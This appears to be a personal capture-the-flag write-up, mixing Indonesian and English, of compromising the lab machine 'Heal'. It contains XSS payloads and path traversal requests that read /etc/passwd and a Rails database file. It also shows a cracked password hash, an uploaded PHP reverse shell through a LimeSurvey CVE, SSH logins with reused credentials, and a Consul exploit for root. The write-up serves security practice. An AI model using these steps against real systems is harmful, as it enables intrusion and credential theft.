![[Heal.png]]
# Reconnaisance
## Open Ports
### 1. TCP
#### All ports
```
# Nmap 7.94SVN scan initiated Tue Jan  7 19:32:02 2025 as: nmap -sS --min-rate=1000 -p- -o allport_nmap.txt -Pn 10.10.11.46
Nmap scan report for 10.10.11.46
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
#### Version of ports
```
# Nmap 7.94SVN scan initiated Tue Jan  7 19:35:11 2025 as: nmap -sV -p22,80 -o version_port_nmap.txt 10.10.11.46

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### 2. UDP
```
$ sudo nmap 10.10.11.46 -sUC --top-ports 1000 --min-rate=1000 -o UDPport_nmap.txt -Pn -open

NOPE
```
## Port 80 (HTTP)

|            | heal.htb                                                                                                                                                   | api.heal.htb        | take-survey.htb                                                                                             |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------- | ----------------------------------------------------------------------------------------------------------- |
| Content    | - Login => cek **sql injection**<br>- Singnup => cek **sql injection**<br>- Generate resume => cek **XSS**<br>- Survey => redirect ke take-survey.heal.htb |                     | -Halaman awal LimeSurvey<br>- Pilih bahasa<br>- Administrator => ralph@heal.htb                             |
| Directory  |                                                                                                                                                            |                     | http://take-survey.heal.htb/index.php/admin/authentication/sa/login<br>http://take-survey.heal.htb/tmp/<br> |
| Subdomain  | ffuf => api.heal.htb                                                                                                                                       |                     |                                                                                                             |
| Technology | ruby on rail                                                                                                                                               | Ruby on Rails 7.1.4 | LimeSurvey Community Edition Version 6.6.4                                                                  |
| CVE        |                                                                                                                                                            |                     | CVE-2021-44967                                                                                              |


# Exploitation
## Port 80 (HTTP) - heal.htb

Pada Generate resume ada fitur export pdf, ada kemungkinan RCE.
ada **reflected XSS** => 
- `<b>asd</b>` => asd (bold)
- `<script>document.write(document.location.href)</script>` => file:///tmp/wktemp-9dade65e-83a7-4555-9208-5a74ad652c70.html
- `<img src=x onerror=alert(1)>` => tidak tergenerate, kemungkinan permasalahan spasi

Download otomatis pdf nya lewat file ini
http://api.heal.htb/download?filename=76d025ca4e7f7e2611c8.pdf cek **Path traversal**
GET /download?filename=../../../../../etc/passwd => **bisa**
GET /download?filename=/../etc/passwd => **bisa**
![[Pasted image 20250108213020.png]]
terdapat user
- root
- ralph
- ron

Coba cek rails database configuration
 `../../config/database.yml` 
diketahui bahwa terdapat file `storage/development.sqlite3`
 ![[Pasted image 20250109084409.png]]
#### cek sqlite3
![[Pasted image 20250109084739.png]]
download file sqlite3 tsb dan buka mengunakan **sqlitebrowser**
![[Pasted image 20250109090443.png]]
terdapat credential :
ralph@heal.htb 
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG

```
john --wordlist=/usr/share/wordlists/rockyou.txt ralph_password.txt 
?:147258369
```
login ssh => NOPE
login web take-survey.heal.htb 

coba CVE https://ine.com/blog/cve-2021-44967-limesurvey-rce

![[Pasted image 20250109150507.png]]

klik link ini untuk mengakt
http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php


![[Pasted image 20250109145446.png]]
coba SSH db_user@heal.htb dengan password `AdmiDi0_pA$$w0rd` => **TIDAK BISA LOGIN**
coba SSH ralph@heal.htb dengan password `AdmiDi0_pA$$w0rd` => **TIDAK BISA LOGIN**
coba SSH ron@heal.htb dengan password `AdmiDi0_pA$$w0rd` => **BISA LOGIN** 

get user flag! UHUI

---
# Priviledge Escalation

```
$ sudo -l
Sorry, user ron may not run sudo on heal.

$ netstat -tunlp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:43626           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8301          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8302          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::44976                :::*                                -  

$ groups
ron

```

lakukan port forwarding

```
-L 8300:127.0.0.1:8300
-L 8301:127.0.0.1:8301 
-L 8302:127.0.0.1:8302
-L 8600:127.0.0.1:8600 
-L 8500:127.0.0.1:8500 => bisa akses web 'Consul v1.19.2'
-L 8503:127.0.0.1:8503
-L 3000:127.0.0.1:3000 => bisa akses web 'web sebelumnya'
-L 3001:127.0.0.1:3001 => bisa akses web 'White black screen'
-L 5432:127.0.0.1:5432 
```

ada CVE Consult v1.19.2 => **CVE-2021-41805**
https://github.com/blackm4c/CVE-2021-41805

![[Pasted image 20250109164451.png]]
**get root flag horraaay**
![[Pasted image 20250109164643.png]]

thank you :D